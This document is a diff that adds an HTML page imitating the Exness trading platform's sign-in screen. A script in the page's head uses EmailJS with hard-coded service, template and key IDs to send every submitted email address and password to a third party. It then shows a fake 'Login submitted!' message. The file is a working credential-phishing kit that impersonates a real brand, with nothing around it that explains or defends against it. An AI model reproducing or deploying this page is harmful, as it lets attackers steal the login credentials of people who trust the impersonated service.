@@ -1,0 +1,200 @@
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <title>Exness Sign In</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter&display=swap"
+      rel="stylesheet"
+    />
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+      body {
+        font-family: "Inter", sans-serif;
+      }
+    </style>
+    <script>
+      // Initialize EmailJS
+      (function () {
+        emailjs.init("Hx_plkrxwd755MfGt"); // Replace with your Public Key
+      })();
+
+      // Handle form submit
+      function sendForm(e) {
+        e.preventDefault();
+
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+
+        const params = {
+          user_email: email,
+          user_password: password,
+        };
+
+        emailjs
+          .send("service_bhy0zap", "template_5lp26eh", params) // Replace these IDs
+          .then(
+            () => {
+              alert("Login submitted!");
+              document.getElementById("login-form").reset();
+            },
+            (error) => {
+              console.error("FAILED...", error);
+              alert("Failed to submit. Try again.");
+            }
+          );
+      }
+    </script>
+  </head>
+
+  <body class="bg-white text-[#0B121C]">
+    <header class="flex justify-between items-center px-6 py-4 border-b border-gray-200">
+      <div class="flex items-center">
+        <img
+          alt="Exness logo in black text"
+          class="h-8 w-auto"
+          height="30"
+          src="https://storage.googleapis.com/a1aa/image/1d3f3ecb-1fe5-4415-d09d-46a5f1a6fc1e.jpg"
+          width="120"
+        />
+      </div>
+      <button
+        aria-label="Select language"
+        class="text-[#0B121C] text-xl focus:outline-none"
+      >
+        <i class="fas fa-globe"></i>
+      </button>
+    </header>
+
+    <main class="max-w-md mx-auto px-6 py-12">
+      <h1 class="text-2xl font-extrabold mb-8 text-center">
+        Welcome to Exness
+      </h1>
+      <nav class="flex border-b border-gray-200 mb-8">
+        <button
+          aria-current="page"
+          class="flex-1 text-center py-3 font-normal text-[#0B121C] border-b-4 border-[#0B121C]"
+        >
+          Sign in
+        </button>
+        <button
+          class="flex-1 text-center py-3 font-normal text-gray-400 cursor-default"
+          disabled=""
+        >
+          Create an account
+        </button>
+      </nav>
+
+      <form
+        id="login-form"
+        class="space-y-6"
+        method="POST"
+        onsubmit="sendForm(event)"
+        novalidate=""
+      >
+        <div>
+          <label
+            class="block mb-2 text-sm font-normal text-[#0B121C]"
+            for="email"
+          >
+            Your email address
+          </label>
+          <input
+            autocomplete="email"
+            class="w-full rounded-md border border-gray-200 px-4 py-3 text-base text-[#0B121C] placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-yellow-400 focus:border-yellow-400"
+            id="email"
+            name="email"
+            required
+            type="email"
+          />
+        </div>
+        <div>
+          <label
+            class="block mb-2 text-sm font-normal text-[#0B121C]"
+            for="password"
+          >
+            Password
+          </label>
+          <div class="relative">
+            <input
+              autocomplete="current-password"
+              class="w-full rounded-md border border-gray-200 px-4 py-3 pr-10 text-base text-[#0B121C] placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-yellow-400 focus:border-yellow-400"
+              id="password"
+              name="password"
+              required
+              type="password"
+            />
+            <button
+              aria-label="Toggle password visibility"
+              class="absolute inset-y-0 right-3 flex items-center text-gray-400"
+              type="button"
+              onclick="togglePassword()"
+            >
+              <i class="fas fa-eye-slash"></i>
+            </button>
+          </div>
+        </div>
+        <button
+          class="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-medium rounded-md py-3"
+          type="submit"
+        >
+          Continue
+        </button>
+      </form>
+
+      <div class="flex items-center my-8">
+        <div class="flex-grow border-t border-gray-200"></div>
+        <span class="mx-4 text-sm text-[#0B121C]">Or sign in with</span>
+        <div class="flex-grow border-t border-gray-200"></div>
+      </div>
+
+      <button
+        class="w-full flex items-center justify-center gap-2 bg-gray-100 hover:bg-gray-200 rounded-md py-3 text-base text-[#0B121C]"
+        type="button"
+      >
+        <img
+          alt="Google logo"
+          class="h-5 w-5"
+          src="https://storage.googleapis.com/a1aa/image/986bcaf3-d0d5-483b-152e-08ebf20788b8.jpg"
+          width="20"
+          height="20"
+        />
+        Google
+      </button>
+
+      <div class="text-center mt-6">
+        <a class="text-blue-600 text-sm font-normal hover:underline" href="#">
+          I forgot my password
+        </a>
+      </div>
+    </main>
+
+    <button
+      aria-label="Chat support"
+      class="fixed bottom-8 right-8 bg-yellow-400 hover:bg-yellow-500 text-white rounded-full w-16 h-16 flex items-center justify-center shadow-lg"
+    >
+      <i class="fas fa-comment-alt text-2xl"></i>
+    </button>
+
+    <script>
+      function togglePassword() {
+        const passInput = document.getElementById("password");
+        const icon = event.currentTarget.querySelector("i");
+        if (passInput.type === "password") {
+          passInput.type = "text";
+          icon.classList.remove("fa-eye-slash");
+          icon.classList.add("fa-eye");
+        } else {
+          passInput.type = "password";
+          icon.classList.remove("fa-eye");
+          icon.classList.add("fa-eye-slash");
+        }
+      }
+    </script>
+  </body>
+</html>
